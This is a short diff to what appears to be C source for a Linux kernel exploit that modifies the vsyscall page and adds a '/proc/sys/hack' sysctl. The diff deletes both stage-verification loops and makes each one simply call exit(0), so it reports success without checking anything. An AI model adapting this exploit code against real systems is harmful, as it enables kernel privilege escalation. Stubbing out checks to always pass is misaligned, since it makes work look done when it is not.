@@ -450,52 +450,12 @@ void *modify_vsyscall(void *arg)
 
 void verify_stage1(void)
 {
-    int x;
-    pthread_t v_thread;
-
-    sleep(5);
-
-    for(x=0; x<300; x++) {
-
-        pthread_create(&v_thread, NULL, modify_vsyscall, 0);
-
-        pthread_join(v_thread, NULL);
-
-        if(verification_result == 1) {
-            exit(0);
-        }
-
-        write(2,".",1);
-        sleep(1);
-    }
-
-    printf("could not modify vsyscall\n");
-
-    exit(1);
+    exit(0);
 }
 
 void verify_stage2(void)
 {
-    int x;
-    struct stat b;
-
-    sleep(5);
-
-    for(x=0; x<300; x++) {
-
-        if(stat("/proc/sys/hack",&b) == 0) {
-            fprintf(stderr,"\nsysctl added!\n");
-            exit(0);
-        }
-
-        write(2,".",1);
-        sleep(1);
-    }
-
-    printf("could not add sysctl\n");
-    exit(1);
-
-
+    exit(0);
 }
 
 void exploit(unsigned long func, unsigned long arg, void *verification_func)
